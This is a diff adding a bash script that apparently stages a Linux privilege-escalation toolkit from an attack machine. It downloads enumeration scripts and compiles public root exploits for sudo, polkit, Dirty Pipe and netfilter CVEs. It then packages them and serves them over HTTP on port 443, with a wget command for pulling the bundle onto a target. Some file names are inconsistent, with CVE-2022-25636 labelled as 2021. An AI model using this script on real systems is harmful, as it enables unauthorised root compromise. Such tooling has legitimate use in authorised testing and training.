@@ -1,0 +1,82 @@
+#!/usr/bin/env bash
+
+# Tool to download linux privesc tools to current directory
+
+trap "exit" INT
+
+# Copy unix privesc check
+sudo cp /usr/share/unix-privesc-check/unix-privesc-check . && [ -f ./unix-privesc-check ] && printf "[+] unix-privesc-check downloaded to current directory\n" || printf "[-] Problem moving unix-privesc-check to current directory\n"
+
+# Download linpeas
+wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && [ -f ./linpeas.sh ] &&  (printf "[+] Downloaded linpeas.sh\n" && chmod +x linpeas.sh) || printf "[-] Download issue. linpeas.sh not downloaded\n"
+curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh > LinEnum.sh && [ -f ./LinEnum.sh ] &&  (printf "[+] Downloaded LinEnum.sh\n" && chmod +x LinEnum.sh) || printf "[-] Download issue. LinEnum.sh not downloaded\n"
+curl -s https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh > les.sh && [ -f ./les.sh ] &&  (printf "[+] Downloaded les.sh\n" && chmod +x les.sh) || printf "[-] Download issue. les.sh not downloaded\n"
+curl -s https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py > linuxprivchecker.py && [ -f ./linuxprivchecker.py ] &&  (printf "[+] Downloaded linuxprivchecker.py\n" && chmod +x linuxprivchecker.py) || printf "[-] Download issue. linuxprivchecker.py not downloaded\n"
+
+# Kernel exploit dependencies
+sudo apt install libcap-dev libfuse-dev -y
+sudo apt install -y libnftnl-dev libmnl-dev
+
+
+# Sudo - CVE-2021-3156
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156 && make
+mv sudo-hax-me-a-sandwich ../CVE-2021-3156-exploit
+chmod +x ../CVE-2021-3156-exploit && cd ../
+tar -zcvf CVE-2021-3156.tar.gz ./CVE-2021-3156
+
+# Polkit - CVE-2021-4034
+curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > CVE-2021-4034-exploit.c
+gcc CVE-2021-4034-exploit.c -o CVE-2021-4034-exploit
+#rm -rf CVE-2021-4034-exploit.c
+
+# Dirty Pipe - CVE-2022-0847
+curl -s https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c > CVE-2022-0847-exploit-1.c
+curl -s https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c > CVE-2022-0847-exploit-2.c
+gcc CVE-2022-0847-exploit-1.c -o CVE-2022-0847-exploit-1
+gcc CVE-2022-0847-exploit-2.c -o CVE-2022-0847-exploit-2
+#rm -rf CVE-2022-0847-exploit-1.c CVE-2022-0847-exploit-2.c
+
+# Netfilter - CVE-2021-22555
+curl -s https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c > CVE-2021-22555.c
+gcc CVE-2021-22555.c -o CVE-2021-22555-exploit
+#rm -rf CVE-2021-22555.c
+
+# Netfilter - CVE-2022-25636
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636 && make
+mv exploit ../CVE-2021-25636-exploit
+chmod +x ../CVE-2021-25636-exploit && cd ../
+tar -zcvf CVE-2021-25636.tar.gz ./CVE-2021-25636
+
+# Netfilter - CVE-2023-32233
+git clone https://github.com/Liuk3r/CVE-2023-32233.git
+cd CVE-2023-32233 && gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+mv exploit ../CVE-2023-32233-exploit
+chmod +x ../CVE-2023-32233-exploit && cd ../
+tar -zcvf CVE-2023-32233.tar.gz ./CVE-2023-32233
+
+
+# Package tools in lintools.zip
+tar -czvf lintools.tar.gz CVE-2021-22555.c CVE-2021-4034-exploit.c CVE-2022-0847-exploit-1.c CVE-2022-0847-exploit-2.c CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linuxprivchecker.py unix-privesc-check les.sh LinEnum.sh linpeas.sh CVE-2023-32233.tar.gz CVE-2021-25636.tar.gz CVE-2021-3156.tar.gz
+printf "[+] Created lintools.tar.gz package\n"
+
+# Clean up files
+printf "[+] Cleaning up files...\n"
+sudo rm -rf CVE-2023-32233-exploit CVE-2021-25636-exploit CVE-2021-22555-exploit CVE-2022-0847-exploit-2 CVE-2022-0847-exploit-1 CVE-2021-4034-exploit CVE-2021-3156-exploit linpeas.sh LinEnum.sh linuxprivchecker.py unix-privesc-check les.sh
+
+# Start webserver
+printf "[+] Starting Python webserver on port 443\n"
+pkill -f "python3 -m http.server 443" 2>/dev/null || true
+python3 -m http.server 443 &>/dev/null &
+
+# Find python http server process ID 
+process_id=`ps -ef | grep 'python3 -m http.server 443' | awk 'NR==1{print $2}'`
+printf "[+] Python3 HTTP service is listening on process PID $process_id\n"
+kali_ip=`ip addr show tun0 | grep -v 'inet6' | grep inet | awk -F " " '{print $2}' | awk -F "/" '{print $1}'`
+printf "wget http://$kali_ip:443/lintools.tar.gz\n" | xclip -selection clipboard
+printf "Command to download lintools.tar.gz from the attack machine:\n
+wget http://$kali_ip:443/lintools.tar.gz\n
+\nCommand to extract lintools.tar.gz:\n
+tar xzf lintools.tar.gz" 
+
